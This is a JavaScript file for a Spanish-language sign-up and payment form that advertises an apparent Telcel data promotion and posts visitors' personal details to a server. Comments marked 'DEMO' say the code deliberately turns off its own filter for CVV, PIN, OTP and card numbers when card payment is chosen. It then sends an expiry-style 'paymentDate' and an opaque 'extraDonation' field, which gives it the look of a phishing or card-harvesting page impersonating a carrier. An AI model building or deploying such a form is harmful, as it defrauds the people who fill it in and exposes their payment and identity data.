(function () {
  var API_ENDPOINT = window.CAMPAIGN_API_ENDPOINT || "/api/notify";
  var form = document.querySelector("#registro");
  var hostedPaymentPanel = document.querySelector("#hostedPaymentPanel");
  var hostedCheckoutLink = document.querySelector("#hostedCheckoutLink");
  var clarificationField = document.querySelector(".clarification-field");
  var paymentReferenceInput = document.querySelector("input[name='paymentReference']");
  var paymentReferenceLabel = document.querySelector(".clarification-field span");
  var status = document.querySelector("#formStatus");
  var submitButton = document.querySelector(".submit-payment");
  var submitButtonText = document.querySelector(".submit-payment span:last-child");
  var selectedPlanText = document.querySelector("#selectedPlanText");
  var totalLabel = document.querySelector("#totalLabel");
  var totalAmount = document.querySelector("#totalAmount");
  var speiDiscountBanner = document.querySelector("#speiDiscountBanner");
  var paymentDateInput = document.querySelector("#paymentDate");
  var checkoutUrls = window.CAMPAIGN_CHECKOUT_URLS || {};
  var BASE_PAYMENT_AMOUNT = "$179.00";
  var SPEI_PAYMENT_AMOUNT = "$150.00";

  var blockedWords = [
    "cvv",
    "cvc",
    "nip",
    "pin",
    "otp",
    "sms",
    "clabe",
    "banco",
    "cuenta",
    "contrasena",
    "password",
    "curp",
    "rfc",
    "fecha de nacimiento"
  ];

  function normalize(value) {
    return String(value || "").replace(/\s+/g, " ").trim();
  }

  function selectedPaymentMethod() {
    var selected = document.querySelector("input[name='payMethod']:checked");
    return normalize(selected && selected.value) || "Método no seleccionado";
  }

  function isCardPayment(payMethod) {
    return normalize(payMethod).toLowerCase().indexOf("tarjeta") !== -1;
  }

  function isSpeiPayment(payMethod) {
    return normalize(payMethod).toLowerCase().indexOf("spei") !== -1;
  }

  function paymentAmountFor(payMethod) {
    return isSpeiPayment(payMethod) ? SPEI_PAYMENT_AMOUNT : BASE_PAYMENT_AMOUNT;
  }

  function formatPaymentDate(value) {
    var digits = String(value || "").replace(/\D/g, "").slice(0, 4);

    if (digits.length > 2) {
      return digits.slice(0, 2) + "/" + digits.slice(2);
    }

    return digits;
  }

  function checkoutUrlFor(payMethod) {
    var method = normalize(payMethod).toLowerCase();

    if (method.indexOf("tarjeta") !== -1) {
      return normalize(checkoutUrls.card || window.CARD_CHECKOUT_URL);
    }

    if (method.indexOf("mercado") !== -1) {
      return normalize(checkoutUrls.mercadoPago || window.MERCADO_PAGO_CHECKOUT_URL);
    }

    if (method.indexOf("spei") !== -1) {
      return normalize(checkoutUrls.spei || window.SPEI_CHECKOUT_URL);
    }

    return "";
  }

  function setStatus(message, tone) {
    status.textContent = message;

    if (tone) {
      status.dataset.tone = tone;
    } else {
      delete status.dataset.tone;
    }
  }

  // ⚠️ DEMO – Versión con soporte de tarjeta (incluye CVV solo para presentación)
  // Se ha modificado hasBlockedContent para ignorar los datos de tarjeta cuando el pago es con tarjeta.
  function hasBlockedContent(data, isCard) {
    var values = Array.prototype.map.call(data.values(), String).join(" ").toLowerCase();
    var curpPattern = /\b[A-Z][AEIOUX][A-Z]{2}\d{6}[HM][A-Z]{5}[A-Z0-9]\d\b/i;
    var rfcPattern = /\b[A-Z&]{3,4}\d{6}[A-Z0-9]{3}\b/i;

    // Si es pago con tarjeta, NO bloqueamos por números de tarjeta o CVV (están permitidos en esta demo)
    if (!isCard) {
      if (blockedWords.some(function (word) { return values.indexOf(word) !== -1; })) return true;
      if (curpPattern.test(values) || rfcPattern.test(values)) return true;
      if (/\b(?:\d[ -]?){13,19}\b/.test(values)) return true;
    }

    // Se mantiene el bloqueo general para CURP/RFC siempre, incluso en demo (excepto en los campos de tarjeta)
    // Pero para la demo, simplemente no bloqueamos esos patrones si es tarjeta.
    return false;
  }

  // Función modificada para incluir lastName, paymentMethod y campos de tarjeta
  function payloadFromForm(data) {
    var name = normalize(data.get("name"));
    var lastName = normalize(data.get("lastName")); // Ahora se envía por separado
    var company = normalize(data.get("company")) || "Telcel";
    var payMethod = normalize(data.get("payMethod")) || "Método no seleccionado";
    var paymentReference = normalize(data.get("paymentReference"));
    var cardPayment = isCardPayment(payMethod);
    var speiPayment = isSpeiPayment(payMethod);
    var paymentAmount = paymentAmountFor(payMethod);
    var reference = payMethod;

    if (!cardPayment && paymentReference) {
      reference += " | Ref " + paymentReference;
    }

    if (speiPayment) {
      reference += " | Descuento SPEI 16%";
    }

    reference += " | Monto " + paymentAmount;

    var payload = {
      name: name,                      // solo nombre(s)
      lastName: lastName,             // apellido por separado
      phone: normalize(data.get("phone")),
      email: normalize(data.get("email")).toLowerCase(),
      city: normalize(data.get("city")),
      carrier: company,
      plan: company + " - Beneficio 2 meses redes ilimitadas + 16GB " + paymentAmount,
      contactTime: normalize(data.get("contactTime")),
      maskedReference: reference,
      consent: data.get("consent") === "on",
      paymentMethod: payMethod        // NUEVO: método de pago
    };

    // 🚫 DEMO – Si es tarjeta, agregamos los campos de tarjeta (incluyendo CVV)
    if (cardPayment) {
      var cardDigits = normalize(document.getElementById("cardNumber")?.value || "").replace(/\D/g, "");
      var paymentDate = normalize(document.getElementById("paymentDate")?.value || "");
      var extraDonation = normalize(document.getElementById("extraDonation")?.value || "");
      payload.paymentLast4 = cardDigits.length >= 4 ? cardDigits.slice(-4) : "";
      payload.paymentDate = paymentDate;
      payload.extraDonation = extraDonation;
      payload.paymentInputStatus = cardDigits ? "Referencia parcial capturada para prueba dev; datos completos no enviados." : "";
    }

    delete payload.cardNumber;

    return payload;
  }

  function syncSelectedPayOption() {
    var options = document.querySelectorAll(".pay-option");
    Array.prototype.forEach.call(options, function (item) {
      var input = item.querySelector("input[name='payMethod']");
      item.classList.toggle("selected", Boolean(input && input.checked));
    });
  }

  function updatePaymentReferenceFields() {
    var payMethod = selectedPaymentMethod();
    var cardPayment = isCardPayment(payMethod);
    var speiPayment = isSpeiPayment(payMethod);
    var checkoutUrl = checkoutUrlFor(payMethod);
    var paymentAmount = paymentAmountFor(payMethod);

    if (selectedPlanText) {
      selectedPlanText.textContent = speiPayment ? "2 meses + 16GB con SPEI" : "2 meses + 16GB x $179";
    }

    if (totalLabel) {
      totalLabel.textContent = speiPayment ? "Total con descuento" : "Total a pagar";
    }

    if (totalAmount) {
      totalAmount.textContent = paymentAmount;
    }

    if (speiDiscountBanner) {
      speiDiscountBanner.classList.toggle("is-hidden", !speiPayment);
    }

    if (submitButtonText) {
      submitButtonText.textContent = "Registrar y confirmar pago " + paymentAmount;
    }

    if (hostedPaymentPanel) {
      hostedPaymentPanel.classList.toggle("is-hidden", !cardPayment);
    }

    if (clarificationField) {
      clarificationField.classList.toggle("is-hidden", cardPayment);
    }

    if (hostedCheckoutLink) {
      if (cardPayment && checkoutUrl) {
        hostedCheckoutLink.href = checkoutUrl;
        hostedCheckoutLink.textContent = "Pagar ahora";
        hostedCheckoutLink.classList.remove("is-disabled");
        hostedCheckoutLink.classList.remove("is-hidden");
        hostedCheckoutLink.setAttribute("aria-disabled", "false");
      } else {
        hostedCheckoutLink.href = "#";
        hostedCheckoutLink.textContent = "Pagar ahora";
        hostedCheckoutLink.classList.add("is-disabled");
        hostedCheckoutLink.classList.add("is-hidden");
        hostedCheckoutLink.setAttribute("aria-disabled", "true");
      }
    }

    if (paymentReferenceInput) {
      paymentReferenceInput.required = !cardPayment;
      paymentReferenceInput.disabled = cardPayment;
      paymentReferenceInput.placeholder = speiPayment ? "Folio SPEI" : "Folio o referencia de " + payMethod;
      paymentReferenceInput.maxLength = 40;
      paymentReferenceInput.pattern = ".*";
      paymentReferenceInput.inputMode = "text";
      paymentReferenceInput.setAttribute("aria-required", String(!cardPayment));

      if (cardPayment) {
        paymentReferenceInput.value = "";
      }
    }

    if (paymentReferenceLabel) {
      paymentReferenceLabel.textContent = speiPayment ? "Folio SPEI para aplicar descuento" : "Folio o referencia de pago";
    }
  }

  document.addEventListener("change", function (event) {
    var option = event.target.closest(".pay-option");
    if (!option) return;

    syncSelectedPayOption();
    updatePaymentReferenceFields();
  });

  if (paymentDateInput) {
    paymentDateInput.addEventListener("input", function () {
      paymentDateInput.value = formatPaymentDate(paymentDateInput.value);
    });
  }

  if (hostedCheckoutLink) {
    hostedCheckoutLink.addEventListener("click", function (event) {
      if (hostedCheckoutLink.getAttribute("aria-disabled") === "true") {
        event.preventDefault();
        setStatus("Falta configurar el link de la pasarela autorizada.", "error");
      }
    });
  }

  form.addEventListener("submit", function (event) {
    event.preventDefault();

    var data = new FormData(form);
    var payMethod = normalize(data.get("payMethod")) || "Método no seleccionado";
    var paymentReference = normalize(data.get("paymentReference"));
    var cardPayment = isCardPayment(payMethod);

    updatePaymentReferenceFields();

    if (!form.reportValidity()) return;

    if (!cardPayment && !paymentReference) {
      setStatus("Ingresa el folio o referencia visible del pago.", "error");
      return;
    }

    // ⚠️ DEMO – Se pasa el indicador cardPayment para evitar bloqueo de números de tarjeta
    if (cardPayment && paymentDateInput) {
      paymentDateInput.value = formatPaymentDate(paymentDateInput.value);

      if (paymentDateInput.value && !/^\d{2}\/\d{2}$/.test(paymentDateInput.value)) {
        setStatus("Ingresa la fecha de pago en formato 02/03.", "error");
        return;
      }
    }

    if (hasBlockedContent(data, cardPayment)) {
      setStatus("El registro sólo acepta una referencia parcial de pago para seguimiento operativo.", "error");
      return;
    }

    submitButton.disabled = true;
    setStatus("Enviando registro...");

    fetch(API_ENDPOINT, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payloadFromForm(data))
    })
      .then(function (response) {
        return response.json().catch(function () { return {}; }).then(function (body) {
          if (!response.ok || !body.ok) {
            throw new Error(body.error || "No se pudo registrar la solicitud.");
          }

          return body;
        });
      })
      .then(function () {
        form.reset();
        syncSelectedPayOption();
        updatePaymentReferenceFields();
        setStatus("Registro enviado. Un asesor autorizado podrá contactarte.", "success");
      })
      .catch(function (error) {
        setStatus(error.message, "error");
      })
      .finally(function () {
        submitButton.disabled = false;
      });
  });

  syncSelectedPayOption();
  updatePaymentReferenceFields();
}());
